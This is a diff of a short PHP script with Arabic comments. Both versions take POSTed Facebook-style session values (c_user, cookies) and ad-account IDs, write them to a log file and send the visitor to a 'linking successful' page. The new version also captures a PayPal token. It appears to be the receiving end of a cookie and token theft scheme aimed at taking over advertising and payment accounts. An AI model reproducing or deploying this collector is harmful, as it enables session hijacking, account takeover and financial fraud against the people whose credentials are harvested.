@@ -1,30 +1,22 @@
 <?php
-// السماح بالطلبات من أي مصدر (حل مشكلة CORS)
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
-header("Access-Control-Allow-Headers: Content-Type");
+// التأكد من أن الطلب يتم عبر POST فقط
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    // استقبال البيانات من الفورم
+    $c_user = $_POST["c_user"] ?? "غير معروف";
+    $adaccount = $_POST["adaccount"] ?? "غير معروف";
+    $cookies = $_POST["cookie"] ?? "غير موجود";
+    $paypal_token = $_POST["paypaltoken"] ?? "غير متوفر";
 
-// التعامل مع طلب OPTIONS للـ CORS
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    http_response_code(200);
-    exit();
-}
+    // تسجيل البيانات (اختياري)
+    $logData = "معرف الحساب: $c_user\nرقم الحساب الإعلاني: $adaccount\nالكوكيز: $cookies\nتوكن PayPal: $paypal_token\n";
+    file_put_contents("logs.txt", $logData, FILE_APPEND);
 
-// التأكد من أن الطلب هو POST
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // استقبال البيانات المرسلة من JavaScript
-    $adaccount = $_POST['adaccount'] ?? 'غير معروف';
-    $c_user = $_POST['c_user'] ?? 'غير معروف';
-    $cookies = $_POST['cookies'] ?? '';
-
-    // (اختياري) تخزين البيانات في ملف تسجيل مؤقت (للتجربة فقط)
-    $logData = "AdAccount: $adaccount, C_User: $c_user, Cookies: $cookies\n";
-    file_put_contents("log.txt", $logData, FILE_APPEND);
-
-    // إعادة التوجيه إلى صفحة "تم الربط"
-    header("Location: success.html");
+    // إعادة توجيه المستخدم لصفحة نجاح الربط
+    header("Location: done.html");
     exit();
 } else {
-    echo json_encode(["error" => "طلب غير صالح"]);
+    // إذا لم يكن الطلب عبر POST، أظهر رسالة خطأ
+    http_response_code(405); // Method Not Allowed
+    echo "❌ طلب غير صحيح! يُسمح فقط بالطلبات من خلال POST.";
 }
 ?>
